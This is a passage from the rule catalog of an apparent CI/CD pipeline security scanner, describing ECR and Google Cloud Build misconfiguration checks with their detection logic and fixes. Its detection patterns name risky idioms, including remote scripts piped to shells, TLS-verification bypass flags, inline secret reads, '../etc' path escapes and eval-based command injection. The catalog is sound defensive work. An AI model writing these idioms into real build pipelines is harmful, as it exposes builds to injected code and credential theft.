**Recommendation.** Set imageTagMutability=IMMUTABLE on the repository. Reference images by digest (sha256:...) in deployment manifests for strongest immutability guarantees.

**Source:** [`ECR-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-003`: Repository policy allows public access <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ecr-003 }

**Evidences:** [`4.2.1`](#ctrl-4-2-1) Ensure access to artifacts is limited, [`4.3.3`](#ctrl-4-3-3) Ensure package registries use authentication and authorisation.

**How this is detected.** A wildcard-principal repo policy means anyone on the internet can pull images. Sometimes intentional (a publicly-distributed base image), but should be a deliberate exposure, typically via the ECR Public registry rather than a private repo with a public policy. The default for build-output images should never be public.

**Recommendation.** Remove wildcard principals from the repository policy. Grant access only to specific AWS account IDs or IAM principals that require it.

**Source:** [`ECR-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-004`: No lifecycle policy configured <span class="pg-sev pg-sev--low">LOW</span> { #detail-ecr-004 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Without a lifecycle policy, untagged images and old tagged images accumulate indefinitely. Stale images keep CVE attack surface available, anyone who can pull from the repo can pull the old, unpatched version even after a newer build has shipped. Lifecycle expiry is the housekeeper that closes that window.

**Recommendation.** Add a lifecycle policy that expires untagged images after a short period (e.g. 7 days) and limits the number of tagged images retained, reducing exposure to images with known CVEs.

**Source:** [`ECR-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-005`: Repository encrypted with AES256 rather than KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-005 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Same shape as CP-002 / CWL-002 / CCM-002: AES256 (the AWS-managed default) gives confidentiality at rest but no key-policy or CloudTrail Decrypt-event story. Container images are arguably sensitive intellectual property, the same key-policy + audit shape as build outputs in S3 is warranted.

**Recommendation.** Set encryptionType=KMS with a customer-managed key ARN.

**Source:** [`ECR-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `GCB-001`: Cloud Build step image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Bare references (``gcr.io/cloud-builders/docker``) are treated as ``:latest`` by Cloud Build. Tag-only references (``:20``, ``:latest``) count as unpinned. Only ``@sha256:…`` suffixes pass.

**Recommendation.** Pin every ``steps[].name`` image to an ``@sha256:<digest>`` suffix. ``gcr.io/cloud-builders/docker:latest`` is mutable; Google publishes new builder images frequently and the next build would pull whatever is current. Resolve the digest with ``gcloud artifacts docker images describe <ref> --format='value(image_summary.digest)'`` and pin it.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-001`](../providers/cloudbuild.md#gcb-001) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-002`: Cloud Build uses the default service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-002 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** The default Cloud Build service account historically held ``roles/cloudbuild.builds.builder`` plus project-level editor in many organisations. Even under the GCP April-2024 default-identity change, the default SA is still broader than what a single pipeline needs. Explicit ``serviceAccount:`` is required to pass.

**Recommendation.** Create a dedicated service account for the build, grant it only the roles the pipeline actually needs (``roles/artifactregistry.writer``, ``roles/storage.objectCreator`` for artifact upload, etc.), and set ``serviceAccount: projects/<PROJECT>/serviceAccounts/<NAME>@...``. Leaving it unset falls back to the default Cloud Build SA, which accumulates roles over a project's lifetime and is routinely granted ``roles/editor``.

**Source:** [`GCB-002`](../providers/cloudbuild.md#gcb-002) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-003`: Secret Manager value referenced in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-003 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data.

**How this is detected.** Detection patterns: literal ``projects/<n>/secrets/<name>/versions/...`` URIs, ``gcloud secrets versions access`` shell invocations, and ``$(gcloud secrets …)`` command substitutions in step args or entrypoint.

**Recommendation.** Map the secret under ``availableSecrets.secretManager[]`` with an ``env:`` alias, then reference it from each step via ``secretEnv: [ALIAS]``. Avoid inline ``gcloud secrets versions access`` in ``args``, the resolved plaintext lands in build logs.

**Known false positives.**

- Steps whose sole purpose is to *grant* a service account access to a secret (``gcloud secrets add-iam-policy-binding``) reference the resource URI without exposing the value. The literal-URI regex doesn't distinguish read from administrative operations. Suppress those specific steps via ``--ignore-file`` once you've confirmed the gcloud subcommand is administrative.

**Source:** [`GCB-003`](../providers/cloudbuild.md#gcb-003) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-004`: dynamicSubstitutions on with user substitutions in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-004 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** The ``_``-prefix is Cloud Build's naming convention for user substitutions; they are editable via build trigger UI, ``gcloud builds submit --substitutions``, and the REST API. Built-in substitutions (``$PROJECT_ID``, ``$COMMIT_SHA``, ``$BUILD_ID``) are derived from the trigger event and are *not* treated as user-controlled by this rule.

**Recommendation.** Either disable ``options.dynamicSubstitutions`` (it defaults to false) or move user substitutions (``$_FOO``) out of step ``args``, pass them through ``env:`` and reference them inside a shell script the builder runs. Dynamic substitution re-evaluates bash syntax after variable expansion, giving trigger-config editors a script-injection channel.

**Known false positives.**

- Pipelines that enable ``dynamicSubstitutions`` solely to use bash parameter expansion on *built-in* substitutions (``${PROJECT_ID/-/_}``) still flag if any step also references a ``$_USER_VAR``, even when the user sub lands in a context that can't reach a shell. The rule has no AST-level awareness of which substitution is consumed by which shell context. Suppress per-step via ``--ignore-file`` after verifying the user sub never feeds bash re-evaluation.

**Source:** [`GCB-004`](../providers/cloudbuild.md#gcb-004) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-005`: Build timeout unset or excessive <span class="pg-sev pg-sev--low">LOW</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-005 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data.

**How this is detected.** Cloud Build's default 10-minute timeout applies silently when ``timeout:`` is absent. Accepted format is ``<N>s`` (seconds); ``<N>m``/``<N>h`` forms are a gcloud convenience and are treated as malformed by the API.

**Recommendation.** Declare an explicit ``timeout:`` at the top of ``cloudbuild.yaml`` bounded to the build's realistic worst case (e.g. ``1800s`` for most container builds). Explicit bounds shorten the window a compromised build can spend on a shared worker and flag regressions when a legitimate step slows down.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-005`](../providers/cloudbuild.md#gcb-005) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-006`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-006 }

**Evidences:** [`2.3.7`](#ctrl-2-3-7) Ensure pipeline steps produce audit logs.

**How this is detected.** Complements GCB-004 (dynamicSubstitutions + user substitution in args). GCB-006 fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the substitution source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary. In Cloud Build these idioms typically appear in ``args: [-c, ...]`` entries under a bash entrypoint.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`GCB-006`](../providers/cloudbuild.md#gcb-006) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-007`: availableSecrets references ``versions/latest`` <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-007 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** ``versions/latest`` is documented as a rolling alias. A build run on Monday and a re-run on Tuesday can consume different secret bodies without any change to ``cloudbuild.yaml``, breaking the reproducibility invariant that pinning protects.

**Recommendation.** Pin each ``availableSecrets.secretManager[].versionName`` to a specific version number (``.../versions/7``) rather than ``latest``. Rotate by updating the number when a new version is promoted, not by silently publishing a new version that the next build pulls.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-007`](../providers/cloudbuild.md#gcb-007) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-008`: No vulnerability scanning step in Cloud Build pipeline <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-008 }

**Evidences:** [`2.4.2`](#ctrl-2-4-2) Ensure pipeline integrity, artifacts are signed by the pipeline.

**How this is detected.** The detector matches tool names anywhere in the document, step images, ``args``, or ``entrypoint`` strings. Container Analysis API scanning configured at the project level counts as compensating control but is out of scope for this YAML-only check; if you rely on it, suppress this rule via ``--checks``.

**Recommendation.** Add a step that runs a vulnerability scanner, trivy, grype, snyk test, npm audit, pip-audit, osv-scanner, or govulncheck. In Cloud Build this typically looks like a step with ``name: aquasec/trivy`` or an ``entrypoint: bash`` step that invokes ``trivy image`` / ``grype <ref>`` on the built image.

**Source:** [`GCB-008`](../providers/cloudbuild.md#gcb-008) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-009`: Artifacts not signed (no cosign / sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-009 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Silent-pass when the pipeline does not appear to produce artifacts (no ``docker push`` / ``gcloud run deploy`` / ``kubectl apply`` / etc. in any step). The detector matches cosign, sigstore, slsa-framework, and notation.

**Recommendation.** Add a signing step before ``images:`` is resolved, for example, a step with ``name: gcr.io/projectsigstore/cosign`` that runs ``cosign sign --yes <registry>/<repo>@<digest>``. Pair with an attestation step (``cosign attest --predicate sbom.json --type cyclonedx``) so consumers can verify both the signature and the build provenance.

**Source:** [`GCB-009`](../providers/cloudbuild.md#gcb-009) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-010`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-010 }

**Evidences:** [`2.1.6`](#ctrl-2-1-6) Ensure build workers have minimal network connectivity.

**How this is detected.** Detects ``curl | bash``, ``wget | sh``, ``bash -c "$(curl …)"``, inline ``python -c urllib.urlopen``, ``curl > x.sh && bash x.sh``, and PowerShell ``irm | iex`` idioms. Vendor-trusted hosts (rustup.rs, get.docker.com, sdk.cloud.google.com, …) are still flagged at HIGH but the hit carries a ``vendor_trusted`` marker so dashboards can stratify known-vendor installers from arbitrary attacker URLs.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository and invoke it from the checkout, removing the network fetch removes the attacker-controllable content entirely.

**Source:** [`GCB-010`](../providers/cloudbuild.md#gcb-010) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-011`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-011 }

**Evidences:** [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Covers ``curl -k`` / ``wget --no-check-certificate``, ``git config http.sslVerify false``, ``NODE_TLS_REJECT_UNAUTHORIZED=0``, ``npm config set strict-ssl false``, ``PYTHONHTTPSVERIFY=0``, ``GOINSECURE=``, ``helm --insecure-skip-tls-verify``, ``kubectl --insecure-skip-tls-verify``, and ``ssh -o StrictHostKeyChecking=no``.

**Recommendation.** Fix the underlying certificate issue, install the correct CA bundle into the step image, or point the tool at a mirror that presents a valid chain. Disabling verification trades a build error for a silent MITM window.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-011`](../providers/cloudbuild.md#gcb-011) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-012`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gcb-012 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified.

**How this is detected.** Complements GCB-003 (inline ``gcloud secrets versions access``) and GCB-007 (``/versions/latest`` alias). This rule runs the shared credential-shape catalog against every string in the YAML. AWS keys, GitHub PATs, Slack webhooks, JWTs, PEM private key blocks, and any user-registered ``--secret-pattern`` regex. Known placeholders like ``EXAMPLE``/``CHANGEME`` are already filtered upstream so fixtures and docs don't false-match.

**Recommendation.** Rotate the exposed credential immediately. Move the value to ``availableSecrets.secretManager`` and reference it via ``secretEnv:`` so the plaintext never lands in the YAML or the build logs. For cloud access prefer workload-identity federation over long-lived keys.

**Source:** [`GCB-012`](../providers/cloudbuild.md#gcb-012) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-013`: Package install bypasses registry integrity (git / path / tarball) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-013 }

**Evidences:** [`2.1.6`](#ctrl-2-1-6) Ensure build workers have minimal network connectivity.

**How this is detected.** Complements GCB-012 (literal secrets) and GCB-010 (curl-pipe). Where those catch attacker content at fetch time, this rule catches installs that silently bypass the lockfile/registry integrity model, the build is technically reproducible but the source of truth is whatever the git ref / filesystem / tarball URL served most recently.

**Recommendation.** Pin git dependencies to a commit SHA (``pip install git+https://…/repo@<sha>``, ``cargo install --git … --rev <sha>``). Publish private packages to Artifact Registry (or another internal registry) instead of installing from a filesystem path or tarball URL.

**Source:** [`GCB-013`](../providers/cloudbuild.md#gcb-013) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-014`: Build logging disabled (options.logging: NONE) <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-014 }

**Evidences:** [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** ``options.logging`` defaults to ``CLOUD_LOGGING_ONLY`` when omitted, which passes. Only the explicit ``NONE`` value (case- insensitive) trips this rule. ``GCS_ONLY`` / ``LEGACY`` pass. They persist logs, just to a different destination.

**Recommendation.** Remove the ``logging: NONE`` override, or replace it with ``CLOUD_LOGGING_ONLY`` / ``GCS_ONLY``, so every step's stdout, stderr, and exit code is persisted. Loss of logs is a detection-and-response black hole; the storage cost is measured in cents.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-014`](../providers/cloudbuild.md#gcb-014) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-015`: SBOM not produced (no CycloneDX / syft / Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-015 }

**Evidences:** [`2.4.2`](#ctrl-2-4-2) Ensure pipeline integrity, artifacts are signed by the pipeline.

**How this is detected.** Complements GCB-009 (signing) and GCB-008 (vuln scanning). Without an SBOM, downstream consumers cannot audit the exact dependency set shipped in a Cloud Build image, delaying vulnerability response when a transitive dep is disclosed. Pairs naturally with ``cosign attest --type cyclonedx`` in a follow-up step.

**Recommendation.** Add an SBOM generation step, ``syft <image> -o cyclonedx-json``, ``trivy image --format cyclonedx``, and publish the resulting document alongside the image (typically via a cosign attestation so the SBOM travels with the artifact).

**Source:** [`GCB-015`](../providers/cloudbuild.md#gcb-015) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-016`: Step dir field contains parent-directory escape (..) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-016 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Cloud Build doesn't sandbox the ``dir:`` value beyond a join against ``/workspace``. ``dir: ../etc`` resolves to ``/etc`` inside the builder container, which is rarely the intent. The check fires on any literal ``..`` segment; single-dot ``./`` and absolute paths are fine.

**Recommendation.** Replace ``..`` traversals in ``dir:`` with absolute paths rooted under ``/workspace`` (e.g. ``dir: /workspace/sub``) or split the work across multiple steps that each set ``dir:`` to an exact subdirectory. The Cloud Build worker starts each step with the workspace mounted at ``/workspace``; a ``..`` escape from there reaches the builder image's root filesystem and any credentials the image carries.

**Source:** [`GCB-016`](../providers/cloudbuild.md#gcb-016) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-017`: Image-producing build does not request SLSA provenance <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-017 }

**Evidences:** [`2.3.7`](#ctrl-2-3-7) Ensure pipeline steps produce audit logs.

**How this is detected.** SLSA Build Level 2 requires that the build platform produce signed provenance. Cloud Build's ``VERIFIED`` verify option is the documented way to opt in. The check is silent when the build does not produce an image (no top-level ``images:`` and no ``docker push`` / ``gcloud run deploy`` style steps); for those, signing and provenance aren't applicable.

**Recommendation.** Set ``options.requestedVerifyOption: VERIFIED`` on builds that publish container images. Cloud Build then emits a signed SLSA provenance attestation alongside the image, which downstream verifiers (Binary Authorization, cosign verify-attestation, gcloud artifacts docker images describe) can use to check that an image was built by the configured pipeline rather than smuggled in from elsewhere.

**Source:** [`GCB-017`](../providers/cloudbuild.md#gcb-017) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-018`: Legacy KMS secrets block in use (prefer availableSecrets / Secret Manager) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-018 }

**Evidences:** [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Cloud Build supports two secret-injection mechanisms. The older ``secrets:`` block carries KMS-encrypted ciphertext directly in the YAML; the cipher is decrypted at build time if the build's service account has ``cloudkms.cryptoKeyDecrypter`` on the key. The newer ``availableSecrets`` block references Secret Manager versions by URL, which is the documented modern approach. The legacy form still works, but rotating a value means re-encrypting and committing a new ciphertext.

**Recommendation.** Migrate from the top-level ``secrets:`` block (KMS-encrypted values stored inline in the YAML) to ``availableSecrets`` + Secret Manager. Replace each ``secrets[].secretEnv`` mapping with a ``versionName`` reference under ``availableSecrets.secretManager``. Secret Manager rotates without re-encrypting and re-committing the YAML, scopes access via IAM rather than the KMS key's IAM, and produces an explicit audit log entry on every read.

**Known false positives.**

- Builds that use both forms during a migration trip the rule on the legacy block. That's intentional, finishing the migration is the fix.

**Source:** [`GCB-018`](../providers/cloudbuild.md#gcb-018) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-019`: Shell entrypoint inlines a user substitution into args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-019 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Distinct from GCB-004, which fires only when ``options.dynamicSubstitutions: true`` re-evaluates bash syntax after expansion. GCB-019 fires whenever a step uses a shell as its entrypoint AND a ``$_USER_VAR`` token lands inside ``args``: Cloud Build expands the substitution before the step runs, and the shell then interprets any metacharacters the substitution carried, straight command injection through trigger configuration.

**Recommendation.** Pass user substitutions through ``env:`` (or ``secretEnv:`` for sensitive values) and reference them inside a checked-in shell script rather than splicing them directly into ``args``. If the step truly needs to invoke shell logic inline, switch the entrypoint to the underlying tool (``docker``, ``gcloud``, ``gsutil``) and let the tool see the substitution as an argument, not as shell text.

**Known false positives.**

- Substitutions whose values are *server-controlled* in practice (e.g. the trigger always supplies a SHA from ``$_HEAD_COMMIT_SHA`` aliased into a ``$_BUILD_TAG`` by the trigger config) still match the user-sub regex because Cloud Build can't distinguish locked from editable trigger fields. Suppress per-step via ``--ignore-file`` once you've verified your trigger policy prevents arbitrary substitution overrides, ideally combined with ``options.substitutionOption: MUST_MATCH`` (GCB-022) to make the lock explicit.

**Source:** [`GCB-019`](../providers/cloudbuild.md#gcb-019) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-020`: serviceAccount points at the default Cloud Build service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-020 }

**Evidences:** [`4.2.1`](#ctrl-4-2-1) Ensure access to artifacts is limited.

**How this is detected.** Complements GCB-002, which only fires when ``serviceAccount:`` is unset. This rule fires when an explicit value is set but still resolves to the project default, typically the email shape ``<digits>@cloudbuild.gserviceaccount.com``, optionally wrapped in the ``projects/<id>/serviceAccounts/...`` URI form. The April-2024 GCP default-identity change kept the same SA shape; the broad-permissions concern remains.

**Recommendation.** Don't bind the build to ``<project-number>@cloudbuild.gserviceaccount.com``. The default Cloud Build SA accumulates roles over a project's lifetime (commonly ``roles/editor`` or broad Artifact Registry / Secret Manager access). Create a dedicated SA per pipeline, grant only the roles the build actually needs, and reference it by its bespoke email (``<name>@<project>.iam.gserviceaccount.com``). Revoking a compromised pipeline then doesn't unbind every other build in the project.

**Known false positives.**

- Single-pipeline GCP projects where the default SA's roles are actively scoped down. Rare in practice; create a named SA anyway so the audit log stays unambiguous about which pipeline made each API call.

**Source:** [`GCB-020`](../providers/cloudbuild.md#gcb-020) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-021`: No private worker pool, build runs on the shared default pool <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-021 }

**Evidences:** [`2.1.6`](#ctrl-2-1-6) Ensure build workers have minimal network connectivity.

**How this is detected.** Cloud Build runs in a shared Google-managed pool by default. Switching to a *private worker pool* is the prerequisite for every other network-perimeter control: egress restriction to specific peered networks, ingress blocking of public endpoints, and traffic interoperation with VPC Service Controls. Both ``options.pool.name`` and the legacy ``options.workerPool`` field are accepted.

**Recommendation.** Set ``options.pool.name: projects/<PROJECT>/locations/<REGION>/workerPools/<NAME>`` to bind the build to a private worker pool inside your VPC. The default pool runs on a shared Google-managed network with public-internet egress and ingress paths Google chooses, which makes egress filtering, VPC-SC perimeters, and source-IP allowlists on internal endpoints impossible. A private pool also gives you the option to disable external IPs and to log the build's network activity through your own VPC flow logs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- OSS / sample / one-off builds that legitimately have no private network and no internal endpoints to protect. Suppress with a brief ``.pipelinecheckignore`` rationale rather than disabling at the catalog level.

**Source:** [`GCB-021`](../providers/cloudbuild.md#gcb-021) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-022`: options.substitutionOption set to ALLOW_LOOSE <span class="pg-sev pg-sev--low">LOW</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-022 }

**Evidences:** [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** Cloud Build accepts two values for ``options.substitutionOption``: ``MUST_MATCH`` (default, any undefined ``$_VAR`` reference fails the build at parse time) and ``ALLOW_LOOSE`` (undefined references silently expand to ``""``). The default is the safer setting; this rule only fires on the explicit ``ALLOW_LOOSE`` opt-in. Builds that genuinely depend on optional substitutions should pass them through ``substitutions:`` defaults, not rely on silent empty-string fallback.

**Recommendation.** Drop ``options.substitutionOption`` (the default is ``MUST_MATCH``) or set it explicitly to ``MUST_MATCH``. ``ALLOW_LOOSE`` makes Cloud Build expand undefined substitutions to the empty string instead of failing the build. That paper-overs typos (``$_REGON`` instead of ``$_REGION``), masks unset variables that should have tripped review, and combined with ``dynamicSubstitutions: true`` (GCB-004) it widens the command-injection surface by letting attacker-controlled substitution tokens collapse to empty strings inside shell commands.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Migration scenarios where a long-running pipeline pre-dates MUST_MATCH and the operator needs ALLOW_LOOSE temporarily. Suppress with a brief ``.pipelinecheckignore`` rationale and an ``expires:`` date so the waiver doesn't outlive the migration.

**Source:** [`GCB-022`](../providers/cloudbuild.md#gcb-022) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-023`: Step references a user substitution not declared in substitutions: <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-023 }

**Evidences:** [`2.4.2`](#ctrl-2-4-2) Ensure pipeline integrity, artifacts are signed by the pipeline.

**How this is detected.** Walks every step's ``args:`` / ``entrypoint:`` / ``env:`` / ``dir:`` / ``id:`` / ``waitFor:`` for ``$_NAME`` tokens (Cloud Build's user-substitution syntax is leading underscore + uppercase / digits / underscore) and cross-references against the top-level ``substitutions:`` mapping. Built-in substitutions (``$PROJECT_ID``, ``$REPO_NAME``, ``$BRANCH_NAME``, ``$TAG_NAME``, ``$COMMIT_SHA``, ``$SHORT_SHA``, ``$REVISION_ID``, ``$BUILD_ID``, ``$LOCATION``, ``$TRIGGER_NAME``, ``$_HEAD_*``, ``$_BASE_*``, ``$_PR_NUMBER`` and the ``$_HEAD_REPO_URL`` family) are Cloud Build server-set and don't appear in ``substitutions:``; the rule allow-lists them so they don't false-positive.

**Recommendation.** Add an entry for every ``$_USER_VAR`` referenced anywhere in the build to the top-level ``substitutions:`` block, either with a sensible default or with an empty string if the trigger always supplies the value. Cloud Build's default ``options.substitutionOption: MUST_MATCH`` then fails the build at parse time on undeclared references (catching typos at the gate). With the looser ``ALLOW_LOOSE`` opt-in (GCB-022) undeclared references silently expand to the empty string, which masks the bug and quietly broadens any shell command that interpolates the value.

**Known false positives.**

- Cloud Build deployments triggered exclusively via ``gcloud builds submit --substitutions=_FOO=bar`` (without a build trigger) may legitimately reference ``$_FOO`` without declaring it under ``substitutions:`` because the value is always supplied from the CLI. The scanner can't observe trigger / CLI configuration, only the YAML. Declaring the variable with an empty-string default is the canonical fix; ``--ignore-file`` is the escape hatch when that's not practical.

**Source:** [`GCB-023`](../providers/cloudbuild.md#gcb-023) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-024`: Build pushes Docker images but top-level images: is empty <span class="pg-sev pg-sev--low">LOW</span> { #detail-gcb-024 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Walks step args / entrypoint / cmd looking for ``docker push`` (or the ``buildx imagetools push`` variant) invocations. When the build has at least one such step but the top-level ``images:`` field is missing or empty, fires. Steps that build *and* push via the ``gcr.io/cloud-builders/docker`` builder image are the common case; ``--push`` flags on ``buildx build`` are also detected. ``kaniko`` and ``buildah`` push idioms aren't currently detected. Those are different builder images entirely.

**Recommendation.** Add every image the build produces to the top-level ``images:`` array (e.g. ``images: ['gcr.io/$PROJECT_ID/myapp:$COMMIT_SHA']``). Cloud Build then verifies the push succeeded before marking the build SUCCESS, records the image in the build's metadata for provenance / Binary Authorization attestation, and surfaces the image in the ``builds.list --image`` query. Without it, a push that happens inside a step is invisible to Cloud Build's tracking layer even though the image still lands in the registry.

**Known false positives.**

- Multi-stage builds where one step pushes an intermediate image to a private cache registry and the final stage pushes the production artifact (which IS in ``images:``) would trip this rule on the cache push. Suppress with ``--ignore-file`` when this matches.

**Source:** [`GCB-024`](../providers/cloudbuild.md#gcb-024) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-025`: Build has no tags for audit / discoverability <span class="pg-sev pg-sev--low">LOW</span> { #detail-gcb-025 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified.

**How this is detected.** Cloud Build tags are user-defined labels attached to a build. They appear in the build's metadata (``tags:`` field on the Build resource), in every Cloud Logging audit event for the build, and as a filter argument to ``gcloud builds list --filter='tags:<value>'``. Substitution-bearing tags (``$BRANCH_NAME``, ``$COMMIT_SHA``) count as populated. Cloud Build expands them at submission time.

**Recommendation.** Add a top-level ``tags:`` array to every ``cloudbuild.yaml``, at minimum, an environment tag (``prod`` / ``staging`` / ``dev``) and a service tag (``backend`` / ``frontend`` / ``infra``). Cloud Build records tags in the build metadata and Cloud Logging entries so post-incident triage of ``which build emitted this`` becomes a single ``gcloud builds list --filter='tags:prod'`` query. Without tags, builds discoverable only by build-id; the id is a UUID with no signal.

**Known false positives.**

- Single-purpose project-local builds in a sandbox project may legitimately not need tags. Suppress with ``--ignore-file`` if that matches.

**Source:** [`GCB-025`](../providers/cloudbuild.md#gcb-025) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-026`: Step waitFor: references an unknown step id <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-026 }

**Evidences:** [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

